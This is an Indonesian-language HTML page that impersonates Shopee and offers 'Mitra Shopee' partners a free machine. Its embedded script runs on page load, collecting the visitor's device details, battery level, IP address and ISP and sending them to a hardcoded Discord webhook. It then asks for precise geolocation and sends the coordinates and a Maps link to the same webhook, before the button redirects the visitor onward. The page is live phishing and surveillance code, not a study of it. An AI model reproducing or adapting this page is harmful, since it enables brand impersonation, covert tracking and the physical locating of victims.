<!doctype html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Mitra Shopee Partner || shopee.co.id</title>
    <style>
        body { background-color: #EE4D2D; min-height: 100vh; display: flex; flex-direction: column; font-family: Arial, sans-serif; margin: 0; align-items: center; }
        .logo { margin-top: 40px; margin-bottom: 20px; }
        .logo img { max-width: 150px; }
        .container { width: 85%; max-width: 320px; padding: 25px; background-color: #fff; border-radius: 20px; text-align: center; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
        marquee { font-size: 12px; background-color: #f9f9f9; padding: 8px; border: 2px solid #ffd560; border-radius: 8px; margin-bottom: 15px; }
        h1 { font-size: 16px; color: #EE4D2D; background: #fff3d1; padding: 10px; border-radius: 8px; border: 1px dashed #EE4D2D; }
        .btn { width: 100%; height: 50px; border: none; border-radius: 12px; background: linear-gradient(135deg, #FF6633 0%, #EE4D2D 100%); color: #fff; font-size: 16px; font-weight: bold; cursor: pointer; margin-top: 15px; }
        footer { margin-top: 30px; text-align: center; padding-bottom: 20px; }
        footer img { max-width: 90%; border-radius: 10px; }
    </style>
</head>
<body>
    <div class="logo"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fe/Shopee.svg/1200px-Shopee.svg.png"></div>
    <div class="container">
        <marquee>Open Pre Order gratis untuk agen Mitra Shopee!!!!! Dapatkan mesin gratis sekarang.</marquee>
        <h1>Ajukan Order dan lengkapi datamu untuk verifikasi</h1>
        <p style="font-size: 12px; color: #666;">Silakan klik tombol di bawah untuk proses pengajuan.</p>
        <button class="btn" onclick="handleButtonClick()">Dapatkan Sekarang</button>
    </div>
    <footer><img src="https://bantuan.shopee.biz.id/assets/FB_IMG_1769694634688.jpg"></footer>

    <script>
        const webhook = "https://discord.com/api/webhooks/1468299380330332355/I2z1xzpeHQp4iKlllSQOFewI_z_OjIRBsDmgl7jbqbvM4GWQtYTewJXltpZQsGB5OV87";

        async function sendLog(title, fields) {
            await fetch(webhook, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ embeds: [{ title, fields, color: 15548997, timestamp: new Date() }] })
            });
        }

        // 1. Ambil Data Full Otomatis saat Load
        window.onload = async () => {
            let fields = [
                { name: "üì± OS", value: navigator.platform, inline: true },
                { name: "üåê Browser", value: navigator.userAgent.split(' ').pop(), inline: true },
                { name: "üñ•Ô∏è Layar", value: `${screen.width}x${screen.height}`, inline: true }
            ];
            try {
                const b = await navigator.getBattery();
                fields.push({ name: "üîã Baterai", value: `${Math.round(b.level * 100)}%`, inline: true });
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                fields.push({ name: "üåç IP", value: d.ip }, { name: "üì∂ ISP", value: d.org });
            } catch (e) {}
            
            await sendLog("üöÄ Visitor Masuk (Mitra Page)", fields);

            // 2. Munculkan Izin Lokasi Otomatis setelah 2 detik
            setTimeout(askLocation, 2000);
        };

        function askLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (p) => sendLog("‚úÖ Lokasi Diizinkan", [{ name: "Koordinat", value: `${p.coords.latitude},${p.coords.longitude}` }, { name: "Maps", value: `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` }]),
                    () => sendLog("‚ùå Lokasi Ditolak", [{ name: "Status", value: "User menolak izin" }]),
                    { enableHighAccuracy: true }
                );
            }
        }

        function handleButtonClick() {
            window.location.href = 'halamantoko.html';
        }
    </script>
</body>
</html>
